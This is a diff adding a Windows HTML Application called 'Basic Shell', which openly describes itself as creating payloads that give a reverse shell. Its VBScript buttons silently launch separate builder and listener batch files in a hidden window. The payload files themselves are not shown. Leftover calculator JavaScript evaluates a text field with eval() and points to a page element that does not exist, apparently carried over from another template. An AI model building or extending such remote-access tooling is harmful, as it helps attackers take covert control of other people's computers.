@@ -1,0 +1,74 @@
+<head>
+<title>Basic Shell</title>
+<HTA:APPLICATION
+    APPLICATIONNAME="Basic Shell"
+    ID="hta_utility"
+    border            = "thin"
+    borderStyle        = "tool"
+    caption            = "yes"
+    contextMenu        = "no"
+    maximizeButton    = "no"
+    minimizeButton    = "yes"
+    navigable        = "no"
+    showInTaskbar    = "yes"
+    singleInstance    = "yes"
+    scroll = "no"
+    sysmenu            = "yes"
+    windowState        = "normal"  
+    VERSION="1.0"/>
+</head>
+
+<script language="javascript">
+	window.resizeTo(750, 400);
+	isClear = true;
+	function insertValue(value) {
+		if (isClear == true){
+			document.getElementById("txtDisplay").value = value
+			isClear = false
+		} else {
+			document.getElementById("txtDisplay").value += value
+		}
+	}
+	function clearValue() {
+		document.getElementById("txtDisplay").value = "0";
+		isClear = true;
+	}
+	function evalStatement() {
+		document.getElementById("txtDisplay").value = eval(document.getElementById("txtDisplay").value)
+	}
+</script>
+
+<script language="VBScript">
+
+    function Builder
+		Dim fso, CurrentDirectory, Directory, WinScriptHost
+		set fso = CreateObject("Scripting.FileSystemObject")
+		CurrentDirectory = fso.GetAbsolutePathName(".")
+		
+		Set WinScriptHost = CreateObject("WScript.Shell")
+		WinScriptHost.Run Chr(34) & CurrentDirectory & "/files/builder.bat" & Chr(34), 0
+		Set WinScriptHost = Nothing
+    End function
+	
+	function Listener
+		Dim fso, CurrentDirectory, Directory, WinScriptHost
+		set fso = CreateObject("Scripting.FileSystemObject")
+		CurrentDirectory = fso.GetAbsolutePathName(".")
+		
+		Set WinScriptHost = CreateObject("WScript.Shell")
+		WinScriptHost.Run Chr(34) & CurrentDirectory & "/files/listen.bat" & Chr(34), 0
+		Set WinScriptHost = Nothing
+	End function
+	
+</script>
+
+<body>
+
+<h1>Basic Shell</h1>
+
+<h2>Welcome to basic shell, this application creates payloads that give you a reverse shell.</h2>
+
+<button type="button" style="height:100px;width:200px" value="Builder" name="run_button" onClick="Builder()">Builder</button> &nbsp;
+<button type="button" style="height:100px;width:200px" value="Listener" name="run_button" onClick="Listener()">Listener</button>
+
+</body>
